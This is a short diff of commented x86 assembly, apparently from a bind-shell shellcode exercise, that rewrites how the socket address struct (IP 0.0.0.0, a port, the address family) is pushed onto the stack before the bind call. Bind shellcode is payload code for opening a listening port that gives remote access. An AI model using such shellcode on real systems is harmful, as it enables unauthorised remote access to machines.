@@ -17,8 +17,9 @@ _start:
     mov esi, eax            ; store the return value (eax) into esi (server)
     
     ; bind(server, (struct sockadd *) &serv_addr, 0x10)
-    push edx                ; still zero, terminate the next value pushed
-    push long 0xBBBB02BB    ; build struct:port, sin.family:02, & and 2 bytes:BB
+    push edx                ; IP address 0.0.0.0
+    push word 0xBBBC        ; port number
+    push word 0x02          ; protocol family
     mov ecx, esp            ; mov addr struct (on stack) to ecx
     push byte 0x10          ; begin the bind args, push 16 (size) on stack
     push ecx                ; save address of struct back on stack
